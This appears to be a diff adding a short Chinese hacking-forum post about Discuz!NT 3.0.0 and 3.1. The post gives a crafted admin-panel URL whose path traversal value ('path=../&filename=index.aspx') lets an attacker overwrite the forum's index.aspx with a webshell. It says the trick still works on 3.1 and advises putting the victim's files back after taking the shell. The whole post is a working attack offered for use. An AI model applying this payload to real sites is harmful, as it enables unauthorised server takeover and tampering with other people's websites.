@@ -1,0 +1,15 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+Discuz!NT 3.0.0 后台拿WEBSHELL ,其实不用那么复杂
+D8888D主贴内容-------------------------------------------------------
+[url=http://test.com/admin/global/global_templatesedit.aspx?path=../&filename=index.aspx&templateid=1&templatename=Default]链接标记http://test.com/admin/global/glo ... emplatename=Default[/url]
+
+直接把你的马写入论坛的index.aspx
+
+或者是其他文件。。
+path=../&filename=index.aspx
+
+但是记的得到SHELL以后要把人家的文件恢复原样哦。
+
+最新版的3.1依然可以这样搞的。
